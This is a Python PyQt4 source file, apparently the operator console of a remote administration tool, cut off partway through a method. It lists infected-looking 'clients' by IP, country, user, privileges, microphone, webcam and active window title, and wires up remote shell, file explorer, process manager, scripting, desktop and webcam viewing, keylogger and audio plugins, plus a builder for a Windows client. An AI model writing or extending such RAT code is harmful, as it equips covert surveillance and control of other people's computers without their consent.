# -*- coding: utf-8 -*-

import sys
import socket
import os
import time
import ast
import zlib
import threading
import hashlib
import string
import random

from PyQt4.QtGui import *
from PyQt4.QtCore import *

from libs import pygeoip
from libs.language import Translate
from ui import gui
from libs.log_viewer import LogViewer
from libs.settings import Config, Settings
from libs.builder import Builder
from libs.data_transfer import data_receive, data_send, data_get
from plugins.mexplorer import main as mexplorer
from plugins.mshell import main as mshell
from plugins.mprocesses import main as mprocesses
from plugins.mscript import main as mscript
from plugins.mdesktop import main as mdesktop
from plugins.mwebcam import main as mwebcam

# initial geo ip database
geo_ip_database = pygeoip.GeoIP('assets\\GeoIP.dat')

# initial assets directories
temp = os.path.join(os.getcwd(), 'temp\\')
if not os.path.exists(temp):
    os.makedirs(temp)
assets = os.path.join(os.getcwd(), 'assets\\')
flags = os.path.join(assets, 'flags')

# Multi Lang
translate = Translate()
_ = lambda _word: translate.word(_word)


def get_ip_location(ip):
    try:
        country_flag = os.path.join(flags, geo_ip_database.country_code_by_addr(ip).lower() + '.png')
        if os.path.exists(country_flag):
            return country_flag
        else:
            return os.path.join(flags, 'blank.png')
    except:
        return os.path.join(flags, 'blank.png')


def id_generator(size=16, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))


class MainDialog(QMainWindow, gui.Ui_MainWindow):
    def __init__(self, parent=None):
        super(MainDialog, self).__init__(parent)
        self.setupUi(self)

        self.settings = Config()

        # set settings
        self.update_settings()

        # update gui
        self.gui = QApplication.processEvents

        self.portLabel.setText('[%s]' % str(self.PORT))
        self.ipv4Label.setText('[%s]' % str(self.IPADDRESS))

        # unlocked servers bank
        self.unlockedSockets = []

        # listen status
        self.acceptthreadState = False

        # Log Viewers
        self.log_viewers = {}

        # plugins bank
        self.pluginsBank = {}

        # disable panel buttons
        self.actionRemote_Shell.setDisabled(True)
        self.actionRemote_Explorer.setDisabled(True)
        self.actionRemote_Process_Manager.setDisabled(True)
        self.actionRemote_Scripting.setDisabled(True)
        self.actionDesktop_Preview.setDisabled(True)
        self.actionWebcam_Preview.setDisabled(True)
        self.actionLock_Client.setDisabled(True)
        self.actionStop_Client.setDisabled(True)
        self.actionUnlock_Client.setDisabled(True)

        # indexes for servers table
        self.index_of_moderator = 0
        self.index_of_ipAddress = 1
        self.index_of_alias = 2
        self.index_of_id = 3
        self.index_of_os = 4
        self.index_of_user = 5
        self.index_of_privs = 6
        self.index_of_lock = 7
        self.index_of_microphone = 8
        self.index_of_webcamera = 9
        self.index_of_activeWindowTitle = 10

        # initialize online clients table columns width
        self.clientsTable.setColumnWidth(self.index_of_moderator, 100)
        self.clientsTable.setColumnWidth(self.index_of_ipAddress, 100)
        self.clientsTable.setColumnWidth(self.index_of_alias, 100)
        self.clientsTable.setColumnWidth(self.index_of_id, 100)
        self.clientsTable.setColumnWidth(self.index_of_os, 100)
        self.clientsTable.setColumnWidth(self.index_of_user, 100)
        self.clientsTable.setColumnWidth(self.index_of_privs, 40)
        self.clientsTable.setColumnWidth(self.index_of_lock, 40)
        self.clientsTable.setColumnWidth(self.index_of_microphone, 40)
        self.clientsTable.setColumnWidth(self.index_of_webcamera, 40)

        # initialize moderators table columns width
        self.moderatorsTable.setColumnWidth(3, 120)

        # Init Filter Widgets
        self.init_filters()

        # Hide Moderators Columns
        self.clientsTable.setColumnHidden(self.index_of_moderator, True)
        self.offlineClientsTable.setColumnHidden(0, True)

        # servers table double click trigger
        self.clientsTable.doubleClicked.connect(self.unlock_client)
        # Initializing right click menu
        self.clientsTable.setContextMenuPolicy(Qt.CustomContextMenu)
        self.connect(self.clientsTable, SIGNAL('customContextMenuRequested(const QPoint&)'),
                     self.server_right_click_menu)

        # self.clientsTable.clicked.connect(self.get_preview)

        # Triggers
        self.actionStartListen_for_connections.triggered.connect(self.connect_to_server)
        self.actionStopListen_for_connections.triggered.connect(self.disconnect_from_server)
        self.actionClient_Configuration.triggered.connect(self.run_settings)

        # Panel Triggers
        self.actionUnlock_Client.triggered.connect(self.unlock_client)
        self.actionLock_Client.triggered.connect(self.lock_client)
        self.actionStop_Client.triggered.connect(self.terminate_client)
        self.actionSet_Alias.triggered.connect(self.add_alias)
        ###
        self.actionRemote_Shell.triggered.connect(lambda: self.run_plugin('shellMode'))
        self.actionRemote_Explorer.triggered.connect(lambda: self.run_plugin('explorerMode'))
        self.actionRemote_Scripting.triggered.connect(lambda: self.run_plugin('scriptingMode'))
        self.actionRemote_Process_Manager.triggered.connect(lambda: self.run_plugin('processesMode'))
        ###
        self.actionDesktop_Preview.triggered.connect(self.get_desktop_preview)
        self.actionWebcam_Preview.triggered.connect(self.get_webcam_preview)

        # ADMINISTRATOR BUTTONS
        self.getModeratorsButton.clicked.connect(self.get_moderators)
        self.addModeratorButton.clicked.connect(self.add_moderator)

        # builder trigger
        self.actionWindows_Client_PyInstaller.triggered.connect(self.run_builder)

        # Custom signal for update server table
        self.connect(self, SIGNAL('updateTable()'), self.update_servers_table)
        self.connect(self, SIGNAL('updatePanel()'), self.update_main_menu)
        self.connect(self, SIGNAL('executeShell()'), lambda: self.execute_plugin(plugin='shell'))
        self.connect(self, SIGNAL('executeExplorer()'), lambda: self.execute_plugin(plugin='explorer'))
        self.connect(self, SIGNAL('executeAudio()'), lambda: self.execute_plugin(plugin='audio'))
        self.connect(self, SIGNAL('executeKeylogger()'), lambda: self.execute_plugin(plugin='keylogger'))
        self.connect(self, SIGNAL('executeScripting()'), lambda: self.execute_plugin(plugin='scripting'))
        self.connect(self, SIGNAL('executeProcesses()'), lambda: self.execute_plugin(plugin='processes'))

        self.set_language()
        # disable administrator
        self.disable_administrator()

    def init_filters(self):

        # init filters
        self.filters = {
            'moderator': '',
            'ip_address': '',
            'alias': '',
            'key': '',
            'os': '',
            'user': '',
            'privs': '',
            'lock': '',
            'audio': '',
            'camera': '',
            'title': '',
        }

        self.offline_filters = {
            'moderator': '',
            'key': '',
            'alias': '',
            'ip_address': '',
        }

        self.clientsTable.setRowCount(1)

        self.offlineClientsTable.setRowCount(1)

        # Moderators
        self.filter_moderator_line = QLineEdit()
        self.filter_moderator_line.setStyleSheet('background-color: #2c3e50;\n'
                                                 'border: 1px ridge;\n'
                                                 'border-top: none;\n'
                                                 'border-right: none;\n'
                                                 'border-color: #2c3e50;')
        self.filter_moderator_line.setPlaceholderText(_('FILTER_FILTER'))
        self.filter_moderator_line.textChanged.connect(self.filter_clients)
        self.clientsTable.setCellWidget(0, self.index_of_moderator, self.filter_moderator_line)

        # Ip Address
        self.filter_ipaddress_line = QLineEdit()
        self.filter_ipaddress_line.setStyleSheet('background-color: #2c3e50;\n'
                                                 'border: 1px ridge;\n'
                                                 'border-top: none;\n'
                                                 'border-right: none;\n'
                                                 'border-color: #2c3e50;')
        self.filter_ipaddress_line.setPlaceholderText(_('FILTER_FILTER'))
        self.filter_ipaddress_line.textChanged.connect(self.filter_clients)
        self.clientsTable.setCellWidget(0, self.index_of_ipAddress, self.filter_ipaddress_line)

        # Alias
        self.filter_alias_line = QLineEdit()
        self.filter_alias_line.setStyleSheet('background-color: #2c3e50;\n'
                                                 'border: 1px ridge;\n'
                                                 'border-top: none;\n'
                                                 'border-right: none;\n'
                                                 'border-color: #2c3e50;')
        self.filter_alias_line.setPlaceholderText(_('FILTER_FILTER'))
        self.filter_alias_line.textChanged.connect(self.filter_clients)
        self.clientsTable.setCellWidget(0, self.index_of_alias, self.filter_alias_line)

        # Socket
        self.filter_socket_line = QLineEdit()
        self.filter_socket_line.setStyleSheet('background-color: #2c3e50;\n'
                                                 'border: 1px ridge;\n'
                                                 'border-top: none;\n'
                                                 'border-right: none;\n'
                                                 'border-color: #2c3e50;')
        self.filter_socket_line.setPlaceholderText(_('FILTER_FILTER'))
        self.filter_socket_line.textChanged.connect(self.filter_clients)
        self.clientsTable.setCellWidget(0, self.index_of_id, self.filter_socket_line)

        # Os
        self.filter_os_line = QLineEdit()
        self.filter_os_line.setStyleSheet('background-color: #2c3e50;\n'
                                                 'border: 1px ridge;\n'
                                                 'border-top: none;\n'
                                                 'border-right: none;\n'
                                                 'border-color: #2c3e50;')
        self.filter_os_line.setPlaceholderText(_('FILTER_FILTER'))
        self.filter_os_line.textChanged.connect(self.filter_clients)
        self.clientsTable.setCellWidget(0, self.index_of_os, self.filter_os_line)

        # User
        self.filter_user_line = QLineEdit()
        self.filter_user_line.setStyleSheet('background-color: #2c3e50;\n'
                                                 'border: 1px ridge;\n'
                                                 'border-top: none;\n'
                                                 'border-right: none;\n'
                                                 'border-color: #2c3e50;')
        self.filter_user_line.setPlaceholderText(_('FILTER_FILTER'))
        self.filter_user_line.textChanged.connect(self.filter_clients)
        self.clientsTable.setCellWidget(0, self.index_of_user, self.filter_user_line)

        # privs
        self.filter_privs_combo = QComboBox()
        self.filter_privs_combo.setEditable(True)
        self.filter_privs_combo.addItem(QIcon(os.path.join(assets, 'false.png')), _('FILTER_ALL'), '')
        self.filter_privs_combo.addItem(QIcon(os.path.join(assets, 'admin.png')), _('INFO_ADMIN'), '1')
        self.filter_privs_combo.addItem(QIcon(os.path.join(assets, 'user.png')), _('INFO_USER'), '0')
        self.filter_privs_combo.setStyleSheet('background-color: #2c3e50;\n'
                                                 'border: 1px ridge;\n'
                                                 'border-top: none;\n'
                                                 'border-right: none;\n'
                                                 'border-color: #2c3e50;')
        self.filter_privs_combo.currentIndexChanged.connect(self.filter_clients)
        self.clientsTable.setCellWidget(0, self.index_of_privs, self.filter_privs_combo)

        # protection
        self.filter_lock_combo = QComboBox()
        self.filter_lock_combo.setEditable(True)
        self.filter_lock_combo.addItem(QIcon(os.path.join(assets, 'false.png')), _('FILTER_ALL'), '')
        self.filter_lock_combo.addItem(QIcon(os.path.join(assets, 'lock.png')), _('INFO_LOCKED'), 'False')
        self.filter_lock_combo.addItem(QIcon(os.path.join(assets, 'unlock.png')), _('INFO_UNLOCKED'), 'True')
        self.filter_lock_combo.setStyleSheet('background-color: #2c3e50;\n'
                                                 'border: 1px ridge;\n'
                                                 'border-top: none;\n'
                                                 'border-right: none;\n'
                                                 'border-color: #2c3e50;')
        self.filter_lock_combo.currentIndexChanged.connect(self.filter_clients)
        self.clientsTable.setCellWidget(0, self.index_of_lock, self.filter_lock_combo)

        # Audio
        self.filter_audio_combo = QComboBox()
        self.filter_audio_combo.setEditable(True)
        self.filter_audio_combo.addItem(QIcon(os.path.join(assets, 'false.png')), _('FILTER_ALL'), '')
        self.filter_audio_combo.addItem(QIcon(os.path.join(assets, 'mic_yes.png')), _('INFO_YES'), ' ')
        self.filter_audio_combo.addItem(QIcon(os.path.join(assets, 'mic_no.png')), _('INFO_NO'), 'NoDevice')
        self.filter_audio_combo.setStyleSheet('background-color: #2c3e50;\n'
                                                 'border: 1px ridge;\n'
                                                 'border-top: none;\n'
                                                 'border-right: none;\n'
                                                 'border-color: #2c3e50;')
        self.filter_audio_combo.currentIndexChanged.connect(self.filter_clients)
        self.clientsTable.setCellWidget(0, self.index_of_microphone, self.filter_audio_combo)

        # Camera
        self.filter_camera_combo = QComboBox()
        self.filter_camera_combo.setEditable(True)
        self.filter_camera_combo.addItem(QIcon(os.path.join(assets, 'false.png')), _('FILTER_ALL'), '')
        self.filter_camera_combo.addItem(QIcon(os.path.join(assets, 'web_camera.png')), _('INFO_YES'), ' ')
        self.filter_camera_combo.addItem(QIcon(os.path.join(assets, 'web_camera_no.png')), _('INFO_NO'), 'NoDevice')
        self.filter_camera_combo.setStyleSheet('background-color: #2c3e50;\n'
                                                 'border: 1px ridge;\n'
                                                 'border-top: none;\n'
                                                 'border-right: none;\n'
                                                 'border-color: #2c3e50;')
        self.filter_camera_combo.currentIndexChanged.connect(self.filter_clients)
        self.clientsTable.setCellWidget(0, self.index_of_webcamera, self.filter_camera_combo)

        # Active Window Title
        self.filter_title_line = QLineEdit()
        self.filter_title_line.setStyleSheet('background-color: #2c3e50;\n'
                                                 'border: 1px ridge;\n'
                                                 'border-top: none;\n'
                                                 'border-color: #2c3e50;')
        self.filter_title_line.setPlaceholderText(_('FILTER_FILTER'))
        self.filter_title_line.textChanged.connect(self.filter_clients)
        self.clientsTable.setCellWidget(0, self.index_of_activeWindowTitle, self.filter_title_line)

        # OFFLINE Clinets

        # Offline Moderators
        self.filter_moderator_line_offline = QLineEdit()
        self.filter_moderator_line_offline.setStyleSheet('background-color: #2c3e50;\n'
                                                 'border: 1px ridge;\n'
                                                 'border-top: none;\n'
                                                 'border-right: none;\n'
                                                 'border-color: #2c3e50;')
        self.filter_moderator_line_offline.setPlaceholderText(_('FILTER_FILTER'))
        self.filter_moderator_line_offline.textChanged.connect(self.filter_offline_clinets)
        self.offlineClientsTable.setCellWidget(0, 0, self.filter_moderator_line_offline)

        # Offline ID
        self.filter_id_line_offline = QLineEdit()
        self.filter_id_line_offline.setStyleSheet('background-color: #2c3e50;\n'
                                                 'border: 1px ridge;\n'
                                                 'border-top: none;\n'
                                                 'border-right: none;\n'
                                                 'border-color: #2c3e50;')
        self.filter_id_line_offline.setPlaceholderText(_('FILTER_FILTER'))
        self.filter_id_line_offline.textChanged.connect(self.filter_offline_clinets)
        self.offlineClientsTable.setCellWidget(0, 1, self.filter_id_line_offline)

        # Offline ID
        self.filter_alias_line_offline = QLineEdit()
        self.filter_alias_line_offline.setStyleSheet('background-color: #2c3e50;\n'
                                                 'border: 1px ridge;\n'
                                                 'border-top: none;\n'
                                                 'border-right: none;\n'
                                                 'border-color: #2c3e50;')
        self.filter_alias_line_offline.setPlaceholderText(_('FILTER_FILTER'))
        self.filter_alias_line_offline.textChanged.connect(self.filter_offline_clinets)
        self.offlineClientsTable.setCellWidget(0, 2, self.filter_alias_line_offline)

        # Offline Ip Address
        self.filter_ipaddress_line_offline = QLineEdit()
        self.filter_ipaddress_line_offline.setStyleSheet('background-color: #2c3e50;\n'
                                                 'border: 1px ridge;\n'
                                                 'border-top: none;\n'
                                                 'border-color: #2c3e50;')
        self.filter_ipaddress_line_offline.setPlaceholderText(_('FILTER_FILTER'))
        self.filter_ipaddress_line_offline.textChanged.connect(self.filter_offline_clinets)
        self.offlineClientsTable.setCellWidget(0, 3, self.filter_ipaddress_line_offline)

    def filter_clients(self):
        self.filters = {
            'moderator': str(self.filter_moderator_line.text()),
            'ip_address': str(self.filter_ipaddress_line.text()),
            'alias': str(self.filter_alias_line.text()),
            'key': str(self.filter_socket_line.text()),
            'os': str(self.filter_os_line.text()),
            'user': str(self.filter_user_line.text()),
            'privs': str(self.filter_privs_combo.itemData(self.filter_privs_combo.currentIndex()).toPyObject()),
            'lock': str(self.filter_lock_combo.itemData(self.filter_lock_combo.currentIndex()).toPyObject()),
            'audio': str(self.filter_audio_combo.itemData(self.filter_audio_combo.currentIndex()).toPyObject()),
            'camera': str(self.filter_camera_combo.itemData(self.filter_camera_combo.currentIndex()).toPyObject()),
            'title': str(self.filter_title_line.text()),
        }

    def filter_offline_clinets(self):
        self.offline_filters = {
            'moderator': str(self.filter_moderator_line_offline.text()),
            'key': str(self.filter_id_line_offline.text()),
            'alias': str(self.filter_alias_line_offline.text()),
            'ip_address': str(self.filter_ipaddress_line_offline.text()),
        }

    def set_language(self):

        # MAIN
        self.setWindowTitle(_('TITLE'))

        # TABS
        self.clientsTabs.setTabText(0, _('CLIENTS_TAB_ONLINE'))
        self.clientsTabs.setTabText(1, _('CLIENTS_TAB_OFFLINE'))
        self.clientsTabs.setTabText(2, _('CLIENTS_TAB_MODERATORS'))

        # HEADERS
        self.clientsTable.horizontalHeaderItem(0).setText(_('HEADER_MODERATOR'))
        self.clientsTable.horizontalHeaderItem(1).setText(_('HEADER_IP_ADDRESS'))
        self.clientsTable.horizontalHeaderItem(2).setText(_('HEADER_ALIAS'))
        self.clientsTable.horizontalHeaderItem(3).setText(_('HEADER_ID'))
        self.clientsTable.horizontalHeaderItem(4).setText(_('HEADER_OS'))
        self.clientsTable.horizontalHeaderItem(5).setText(_('HEADER_USER'))
        self.clientsTable.horizontalHeaderItem(6).setText(_('HEADER_PRIVS'))
        self.clientsTable.horizontalHeaderItem(7).setText(_('HEADER_LOCK'))
        self.clientsTable.horizontalHeaderItem(8).setText(_('HEADER_MIC'))
        self.clientsTable.horizontalHeaderItem(9).setText(_('HEADER_CAM'))
        self.clientsTable.horizontalHeaderItem(10).setText(_('HEADER_ACTIVE_WINDOW_TITLE'))

        self.offlineClientsTable.horizontalHeaderItem(0).setText(_('HEADER_MODERATOR'))
        self.offlineClientsTable.horizontalHeaderItem(1).setText(_('HEADER_ID'))
        self.offlineClientsTable.horizontalHeaderItem(2).setText(_('HEADER_ALIAS'))
        self.offlineClientsTable.horizontalHeaderItem(3).setText(_('HEADER_IP_ADDRESS'))
        self.offlineClientsTable.horizontalHeaderItem(4).setText(_('HEADER_LAST_ONLINE'))
        # END HEADERS

        # BOTTOM
        self.loginStatusLabel.setText(_('BOTTOM_LOGIN_STATUS'))
        self.clientStatusLabel.setText(_('BOTTOM_STATUS'))
        self.ipv4TextLabel.setText(_('BOTTOM_IPV4'))
        self.portTextLabel.setText(_('BOTTOM_PORT'))
        self.serversOnlineStatus.setText(_('BOTTOM_SERVERS_TOTAL'))
        # END BOTTOM

        # MENU
        self.serverMenu.setTitle(_('MENU_SERVER'))
        self.actionStartListen_for_connections.setText(_('MENU_SERVER_START'))
        self.actionStopListen_for_connections.setText(_('MENU_SERVER_STOP'))
        self.actionClient_Configuration.setText(_('MENU_SERVER_CONFIGURATION'))
        self.menuServer.setTitle(_('MENU_CLIENT'))
        self.actionUnlock_Client.setText(_('MENU_CLIENT_UNLOCK'))
        self.actionLock_Client.setText(_('MENU_CLIENT_LOCK'))
        self.actionStop_Client.setText(_('MENU_CLIENT_STOP'))
        self.actionSet_Alias.setText(_('MENU_CLIENT_SET_ALIAS'))
        # END MENU

        # PLUGINS
        self.menuAction.setTitle(_('MENU_PLUGIN'))
        self.actionRemote_Shell.setText(_('MENU_PLUGIN_SHELL'))
        self.actionRemote_Explorer.setText(_('MENU_PLUGIN_EXPLORER'))
        self.actionRemote_Process_Manager.setText(_('MENU_PLUGIN_PROCESSES'))
        self.actionRemote_Scripting.setText(_('MENU_PLUGIN_SCRIPTING'))
        self.actionDesktop_Preview.setText(_('MENU_PLUGIN_DESKTOP'))
        self.actionWebcam_Preview.setText(_('MENU_PLUGIN_WEBCAM'))
        # END PLUGINS

        # BUILDER
        self.menuBuilder.setTitle(_('MENU_BUILDER'))
        self.actionWindows_Client_PyInstaller.setText(_('MENU_BUILDER_PYINSTALLER'))
        # END BUILDER

        # ADMINISTRATION
        self.getModeratorsButton.setText(_('MODERATOR_GET_MODERATORS'))
        self.addModeratorButton.setText(_('MODERATOR_ADD_MDOERATOR'))

        self.moderatorsTable.horizontalHeaderItem(0).setText(_('MODERATORS_HEADER_ID'))
        self.moderatorsTable.horizontalHeaderItem(1).setText(_('MODERATORS_HEADER_ONLINE'))
        self.moderatorsTable.horizontalHeaderItem(2).setText(_('MODERATORS_HEADER_OFFLINE'))
        self.moderatorsTable.horizontalHeaderItem(3).setText(_('MODERATORS_HEADER_PRIVILEGES'))
        self.moderatorsTable.horizontalHeaderItem(4).setText(_('MODERATORS_HEADER_STATUS'))
        self.moderatorsTable.horizontalHeaderItem(5).setText(_('MODERATORS_HEADER_LASTONLINE'))
        # END ADMINISTRATION

    def connect_to_server(self):
        self.connection_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            self.session_id = id_generator(size=24)
            self.connection_socket.connect((self.IPADDRESS, self.PORT))
            if data_receive(self.connection_socket)['payload'] == 'connectSuccess':
                while 1:
                    username, ok = QInputDialog.getText(self, _('UNLOCK_CLIENT'), _('ENTER_USERNAME'),
                                                    QLineEdit.Normal)
                    if ok:
                        password, ok = QInputDialog.getText(self, _('UNLOCK_CLIENT'), _('ENTER_PASSWORD'),
                                                        QLineEdit.Password)
                        if ok:
                            data = data_get(self.connection_socket, 'auth %s %s' % (str(username), str(password)), 'moderatorInitializing', self.session_id)
                            if data['mode'] == 'moderatorInitializing' and data['payload'].startswith('loginSuccess '):

                                # Get Privileges
                                self.privs = int(data['payload'].split()[-1])
                                if self.privs == 1:
                                    self.enable_administrator()
                                elif self.privs == 0:
                                    self.disable_administrator()

                                self.acceptthreadState = True
                                self.servers_checker_thread = threading.Thread(target=self.check_servers, args=(self.session_id,))
                                self.servers_checker_thread.start()

                                # Gui
                                self.actionStopListen_for_connections.setDisabled(False)
                                self.actionStartListen_for_connections.setDisabled(True)

                                # Status Change
                                self.statusLabel.setText('Online')
                                self.statusLabel.setStyleSheet('color: #1abc9c;')

                                return
                            elif data['payload'] == 'loginError':
                                warn = QMessageBox(QMessageBox.Warning, _('INCORRECT_CREDENTIALS'), _('INCORRECT_CREDENTIALS'))
                                ans = warn.exec_()
                                continue
                        else:
                            return
                    else:
                        return
        except socket.error:
            return

    # Enable Administrators Features
    def enable_administrator(self):
        # Online Clients Moderators
        self.clientsTable.showColumn(self.index_of_moderator)
        # Offline Clients Moderators
        self.offlineClientsTable.showColumn(0)
        # Moderators Tab
        self.clientsTabs.setTabEnabled(2, True)
        # Set Status
        self.loginStatusLabel.setText(_(self.session_id))
        self.loginStatusLabel.setStyleSheet('color: #9b59b6')

    # Disable Administrators Features
    def disable_administrator(self):
        # Online Clients Moderators
        self.clientsTable.setColumnHidden(self.index_of_moderator, True)
        # Offline Clients Moderators
        self.offlineClientsTable.setColumnHidden(0, True)
        # Moderators Tab
        self.clientsTabs.setTabEnabled(2, False)
        # Set Status
        try:
            self.loginStatusLabel.setText(_(self.session_id))
            self.loginStatusLabel.setStyleSheet('color: #e67e22')
        except AttributeError:
            self.loginStatusLabel.setText(_('BOTTOM_LOGIN_STATUS'))
            self.loginStatusLabel.setStyleSheet('color: #e74c3c')

    def disconnect_from_server(self):
        # Clear Content
        self.clientsTable.setRowCount(1)
        self.offlineClientsTable.setRowCount(1)

        self.acceptthreadState = False

        del self.connection_socket
        del self.checker_socket

        self.actionStopListen_for_connections.setDisabled(True)
        self.actionStartListen_for_connections.setDisabled(False)

        # Change Status
        self.statusLabel.setText('Offline')
        self.statusLabel.setStyleSheet('color: #d35400;')

        # Clients count
        self.onlineStatus.setText('0')

        # Hide Moderator Column
        self.disable_administrator()

        # Set Login Status to None
        self.loginStatusLabel.setText(_('BOTTOM_LOGIN_STATUS'))
        self.loginStatusLabel.setStyleSheet('color: #e74c3c')

    def check_servers(self, session_id):
        # Init Checker Socket
        self.checker_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.checker_socket.connect((self.IPADDRESS, self.PORT))
        if data_receive(self.checker_socket):
            while self.acceptthreadState:
                try:
                    data = data_get(self.checker_socket, 'getClients', 'getClients', session_id)
                    self.streaming_socks = data['payload']
                    self.emit(SIGNAL('updateTable()'))
                    time.sleep(3)
                except socket.error:
                    self.disconnect_from_server()
                    self.acceptthreadState = False
                except SyntaxError:
                    self.disconnect_from_server()
                    self.acceptthreadState = False


    def view_logs(self):
        client = self.current_client()
        if client:
            args = {
                'sock': self.connection_socket,
                'key': self.streaming_socks[client]['key'],
                'alias': self.streaming_socks[client]['alias'],
                'ip_address': self.streaming_socks[client]['ip_address'],
                'os': self.streaming_socks[client]['os'],
                'session_id': self.session_id,
                'assets': assets,
            }
            temp_id = id_generator()
            self.log_viewers[temp_id] = LogViewer(args)
            self.log_viewers[temp_id].show()

    def get_desktop_preview(self):
        client = self.current_client()
        if client:
            args = {
                'sock': self.connection_socket,
                'client': client,
                'session_id': self.session_id,
                'assets': assets,
            }
            self.desktop_desktop_preview = mdesktop.mainPopup(args)
            self.desktop_desktop_preview.show()

    def get_webcam_preview(self):
        client = self.current_client()
        if client:
            args = {
                'sock': self.connection_socket,
                'client': client,
                'session_id': self.session_id,
                'assets': assets,
            }
            self.camera_preview_dialog = mwebcam.mainPopup(args)
            self.camera_preview_dialog.show()

    # Update Servers Table from self.socks
    def update_servers_table(self):

        online_clients = {}
        offline_clients = {}

        # Split Clients
        for index, key in enumerate(self.streaming_socks):
            if self.streaming_socks[key]['status']:
                if self.filters['moderator'] in self.streaming_socks[key]['moderator'] and \
                                self.filters['ip_address'] in self.streaming_socks[key]['ip_address'] and \
                                self.filters['alias'] in self.streaming_socks[key]['alias'] and \
                                self.filters['key'] in str(self.streaming_socks[key]['key']) and \
                                self.filters['os'] in self.streaming_socks[key]['os'] and \
                                self.filters['user'] in self.streaming_socks[key]['user'] and \
                                self.filters['privs'] in self.streaming_socks[key]['privileges'] and \
                                self.filters['lock'] in self.streaming_socks[key]['protection'] and \
                                self.filters['audio'] in self.streaming_socks[key]['audio_device'] and \
                                self.filters['camera'] in self.streaming_socks[key]['webcamera_device'] and \
                                self.filters['title'] in self.streaming_socks[key]['window_title']:
                    online_clients[index] = self.streaming_socks[key]
            else:
                if self.offline_filters['moderator'] in self.streaming_socks[key]['moderator'] and \
                                self.offline_filters['key'] in self.streaming_socks[key]['key'] and \
                                self.offline_filters['alias'] in self.streaming_socks[key]['alias'] and \
                                self.offline_filters['ip_address'] in self.streaming_socks[key]['ip_address']:
                    offline_clients[index] = self.streaming_socks[key]


        # Arange Clients Table
        self.clientsTable.setRowCount(len(online_clients) + 1)

        try:
            for index, obj in enumerate(online_clients):

                # add moderator
                item = QTableWidgetItem(online_clients[obj]['moderator'])
                item.setTextAlignment(Qt.AlignLeft | Qt.AlignVCenter)
                item.setTextColor(QColor('#f1c40f'))
                self.clientsTable.setItem(index + 1, self.index_of_moderator, item)

                # add ip address & county flag
                ip_address = online_clients[obj]['ip_address']
                item = QTableWidgetItem(ip_address)
                item.setIcon(QIcon(get_ip_location(ip_address)))
                self.clientsTable.setItem(index + 1, self.index_of_ipAddress, item)

                # add alias if avaiable
                alias = online_clients[obj]['alias']
                item = QTableWidgetItem(alias)
                self.clientsTable.setItem(index + 1, self.index_of_alias, item)

                # add socket number
                socket_value = str(online_clients[obj]['key'])
                item = QTableWidgetItem(socket_value)
                if socket_value == 'OFFLINE':
                    item.setFlags(Qt.ItemIsSelectable | Qt.ItemIsEnabled)
                item.setTextAlignment(Qt.AlignCenter | Qt.AlignVCenter)
                self.clientsTable.setItem(index + 1, self.index_of_id, item)

                # add os version
                item = QTableWidgetItem(online_clients[obj]['os'])
                item.setIcon(QIcon(os.path.join(assets, 'windows.png')))
                self.clientsTable.setItem(index + 1, self.index_of_os, item)

                # add server user
                item = QTableWidgetItem(online_clients[obj]['user'])
                item.setTextAlignment(Qt.AlignCenter | Qt.AlignVCenter)
                self.clientsTable.setItem(index + 1, self.index_of_user, item)

                # add user privileges
                try:
                    privs_status = _('INFO_USER') if not online_clients[obj]['privileges'] == '1' else _(
                        'INFO_ADMIN')
                except KeyError:
                    print online_clients[obj]
                item = QTableWidgetItem()
                if privs_status == _('INFO_ADMIN'):
                    item.setIcon(QIcon(os.path.join(assets, 'admin.png')))
                else:
                    item.setIcon(QIcon(os.path.join(assets, 'user.png')))
                item.setText(privs_status)
                self.clientsTable.setItem(index + 1, self.index_of_privs, item)

                # add server lock status
                lock_status = _('INFO_LOCKED') if online_clients[obj]['protection'] == 'False' else _(
                    'INFO_UNLOCKED')
                item = QTableWidgetItem(lock_status)
                if lock_status == _('INFO_LOCKED'):
                    item.setTextColor(QColor('#e67e22'))
                    item.setIcon(QIcon(os.path.join(assets, 'lock.png')))
                else:
                    item.setTextColor(QColor('#2ecc71'))
                    item.setIcon(QIcon(os.path.join(assets, 'unlock.png')))
                self.clientsTable.setItem(index + 1, self.index_of_lock, item)

                # add input device
                item = QTableWidgetItem()
                if online_clients[obj]['audio_device'] == 'NoDevice':
                    item.setIcon(QIcon(os.path.join(assets, 'mic_no.png')))
                    item.setText(_('INFO_NO'))
                else:
                    item.setIcon(QIcon(os.path.join(assets, 'mic_yes.png')))
                    item.setText(_('INFO_YES'))
                self.clientsTable.setItem(index + 1, self.index_of_microphone, item)

                # add webcam device
                item = QTableWidgetItem()
                if online_clients[obj]['webcamera_device'] == 'NoDevice':
                    item.setIcon(QIcon(os.path.join(assets, 'web_camera_no.png')))
                    item.setText(_('INFO_NO'))
                else:
                    item.setIcon(QIcon(os.path.join(assets, 'web_camera.png')))
                    item.setText(_('INFO_YES'))
                self.clientsTable.setItem(index + 1, self.index_of_webcamera, item)

                # add active windows title
                item = QTableWidgetItem(online_clients[obj]['window_title'])
                item.setTextAlignment(Qt.AlignRight | Qt.AlignVCenter)
                item.setTextColor(QColor('#1abc9c'))
                self.clientsTable.setItem(index + 1, self.index_of_activeWindowTitle, item)

        except RuntimeError:
            pass

        self.offlineClientsTable.setRowCount(len(offline_clients) + 1)
        try:
            for index, obj in enumerate(offline_clients):
                item = QTableWidgetItem(offline_clients[obj]['moderator'])
                item.setTextAlignment(Qt.AlignLeft | Qt.AlignVCenter)
                item.setTextColor(QColor('#f1c40f'))
                self.offlineClientsTable.setItem(index + 1, 0, item)

                item = QTableWidgetItem(offline_clients[obj]['key'])
                item.setTextAlignment(Qt.AlignLeft | Qt.AlignVCenter)
                self.offlineClientsTable.setItem(index + 1, 1, item)

                item = QTableWidgetItem(offline_clients[obj]['alias'])
                item.setTextAlignment(Qt.AlignLeft | Qt.AlignVCenter)
                self.offlineClientsTable.setItem(index + 1, 2, item)

                item = QTableWidgetItem(offline_clients[obj]['ip_address'])
                item.setTextAlignment(Qt.AlignLeft | Qt.AlignVCenter)
                self.offlineClientsTable.setItem(index + 1, 3, item)

                item = QTableWidgetItem(offline_clients[obj]['last_online'])
                item.setTextAlignment(Qt.AlignRight | Qt.AlignVCenter)
                self.offlineClientsTable.setItem(index + 1, 4, item)

        except RuntimeError:
            pass

        # update servers online counter
        self.onlineStatus.setText(str(len(online_clients)))

    def unlock_client(self):
        while 1:
            client = self.current_client()
            if client:
